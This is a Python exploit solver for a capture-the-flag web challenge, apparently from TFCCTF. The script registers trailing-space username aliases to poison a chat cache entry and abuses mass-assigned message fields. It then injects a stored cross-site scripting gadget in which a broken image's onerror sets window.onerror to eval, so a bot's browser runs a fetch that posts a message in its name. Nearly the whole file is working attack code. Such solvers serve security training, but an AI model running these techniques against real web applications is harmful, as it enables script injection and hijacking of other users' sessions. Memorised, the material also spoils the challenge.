#!/usr/bin/env python3
"""Exploit solver for the Tagger cache-collision challenge."""

import argparse
import html
import json
import re
import sys
import time
from pathlib import Path

import requests


DEFAULT_TARGET = "http://localhost:5000"
DEFAULT_TIMEOUT_SECONDS = 300
PASSWORD = "Password123!"
FLAG_PATTERN = re.compile(r"TFCCTF\{[^}]+\}")


def registration_payload(username, password):
    return {
        "username": username,
        "password": password,
        "confirmPassword": password,
    }


def extract_user_id(response_html, expected_username):
    pattern = re.compile(
        r'<article class="user-card">.*?'
        r'<h2>(.*?)</h2>.*?'
        r'<form action="/friends/request/(\d+)"',
        re.DOTALL,
    )
    for raw_username, user_id in pattern.findall(response_html):
        if html.unescape(raw_username) == expected_username:
            return user_id
    return None


def extract_request_id(response_html):
    match = re.search(r'action="/friends/accept/(\d+)"', response_html)
    return match.group(1) if match else None


def extract_chat_id(response_html, expected_username):
    pattern = re.compile(
        r'<a class="conversation[^>]*" href="/chat/(\d+)"[^>]*>.*?'
        r'<strong>(.*?)</strong>',
        re.DOTALL,
    )
    for chat_id, raw_username in pattern.findall(response_html):
        if html.unescape(raw_username) == expected_username:
            return chat_id
    return None


def extract_flag(response_html):
    match = FLAG_PATTERN.search(response_html)
    return match.group(0) if match else None


def is_loading_instance(response_html):
    return "tfcctf-challenge-loading" in response_html.lower()


def exploit_messages(flag_holder_id):
    """Build the three-message eval gadget that survives messageMarkup.

    Attribute values are restricted to letters, digits, punctuation, spaces,
    and equals signs, so JavaScript cannot be called directly from onerror.
    The page nevertheless allows inline handlers and unsafe-eval.  A text
    message carries the unrestricted fetch source; the first broken image
    installs eval as window.onerror, and the second broken image throws the
    text source. Chromium then evaluates ``Uncaught =fetch(...)``.
    """
    fetch_source = (
        f"=fetch('/chat/{flag_holder_id}/message', {{method: 'POST', "
        "headers: {'Content-Type': 'application/x-www-form-urlencoded'}, "
        "body: 'message=Give+me+the+flag!'})"
    )
    throw_previous_text = (
        "throw event.target.parentNode.parentNode.previousElementSibling."
        "previousElementSibling.firstElementChild.firstElementChild."
        "textContent"
    )
    return [
        {
            "type": "text",
            "tagName": "message",
            "attributes": "{}",
            "content": fetch_source,
        },
        {
            "type": "image",
            "tagName": "img",
            "attributes": json.dumps({"onerror": "window.onerror=eval"}),
            "content": "",
        },
        {
            "type": "image",
            "tagName": "img",
            "attributes": json.dumps({"onerror": throw_previous_text}),
            "content": "",
        },
    ]


def register_user(session, target, base_username, password):
    """Register a fresh trailing-space alias so reruns do not collide."""
    probe = session.get(target, timeout=15)
    probe.raise_for_status()
    if is_loading_instance(probe.text):
        raise RuntimeError(
            "remote challenge instance is still loading; retry the URL later"
        )

    for spaces in range(1, 17):
        username = base_username + (" " * spaces)
        response = session.post(
            f"{target}/register",
            data=registration_payload(username, password),
            allow_redirects=False,
            timeout=15,
        )
        if response.status_code in (200, 302):
            return username
        if response.status_code != 409:
            raise RuntimeError(
                f"register {username!r} failed with HTTP {response.status_code}"
            )
    raise RuntimeError(f"could not find an unused alias for {base_username!r}")


def find_visible_user_id(session, target, username):
    response = session.get(
        f"{target}/discover",
        params={"q": username.strip()},
        timeout=15,
    )
    response.raise_for_status()
    user_id = extract_user_id(response.text, username)
    if not user_id:
        raise RuntimeError(f"could not find exact visible user {username!r}")
    return user_id


def accept_pending_request(session, target):
    response = session.get(f"{target}/requests", timeout=15)
    response.raise_for_status()
    request_id = extract_request_id(response.text)
    if not request_id:
        raise RuntimeError("could not find the incoming friend request")
    accepted = session.post(
        f"{target}/friends/accept/{request_id}",
        allow_redirects=False,
        timeout=15,
    )
    if accepted.status_code not in (200, 302):
        raise RuntimeError(
            f"accept friend request failed with HTTP {accepted.status_code}"
        )


def send_payload(session, target, friend_id, payload):
    response = session.post(
        f"{target}/chat/{friend_id}/message",
        data={
            # Non-empty message passes the route's text gate. `content` is
            # mass-assigned afterwards and becomes the rendered script/image.
            "message": "payload",
            "type": payload["type"],
            "tagName": payload.get("tagName", "img"),
            "content": payload.get("content", ""),
            "attributes": payload.get("attributes", "{}"),
        },
        allow_redirects=False,
        timeout=15,
    )
    if response.status_code not in (200, 302):
        raise RuntimeError(f"payload send failed with HTTP {response.status_code}")


def solve(target, timeout_seconds=150):
    target = target.rstrip("/")
    s1 = requests.Session()
    s2 = requests.Session()

    print(f"[*] Target: {target}")
    print("[*] Registering trailing-space aliases...")
    hacker_alias = register_user(s1, target, "Hacker", PASSWORD)
    flag_holder_alias = register_user(s2, target, "FlagHolder", PASSWORD)
    print(f"    {hacker_alias!r} / {flag_holder_alias!r}")

    print("[*] Creating the friendship...")
    flag_holder_id = find_visible_user_id(s1, target, flag_holder_alias)
    hacker_id = find_visible_user_id(s2, target, hacker_alias)
    request_response = s1.post(
        f"{target}/friends/request/{flag_holder_id}",
        allow_redirects=False,
        timeout=15,
    )
    if request_response.status_code not in (200, 302):
        raise RuntimeError(
            f"friend request failed with HTTP {request_response.status_code}"
        )
    accept_pending_request(s2, target)

    print("[*] Injecting the cached messages...")
    for payload in exploit_messages(2):
        send_payload(s1, target, flag_holder_id, payload)

    # The fake aliases normalize to Hacker:FlagHolder, poisoning the cache
    # entry later consumed by the real Hacker bot.
    primed = s1.get(f"{target}/chat/{flag_holder_id}", timeout=15)
    primed.raise_for_status()
    if "window.onerror=eval" not in primed.text or "=fetch(&#39;" not in primed.text:
        raise RuntimeError(
            "server did not render the eval gadget; inspect the deployed "
            "messageMarkup behavior"
        )

    print("[*] Waiting for the bot cycle and polling for the flag...")
    deadline = time.monotonic() + timeout_seconds
    while time.monotonic() < deadline:
        time.sleep(3)
        for session, chat_id in ((s1, flag_holder_id), (s2, hacker_id)):
            response = session.get(f"{target}/chat/{chat_id}", timeout=15)
            response.raise_for_status()
            flag = extract_flag(response.text)
            if flag:
                print(f"[+] FLAG: {flag}")
                Path(__file__).resolve().parents[1].joinpath("flag.txt").write_text(
                    flag + "\n", encoding="utf-8"
                )
                return flag
        print("    [*] no flag yet")

    raise TimeoutError("flag was not returned before the timeout")


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", nargs="?", default=DEFAULT_TARGET)
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT_SECONDS)
    args = parser.parse_args(argv)
    try:
        solve(args.target, args.timeout)
    except (requests.RequestException, RuntimeError, TimeoutError) as error:
        print(f"[-] {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
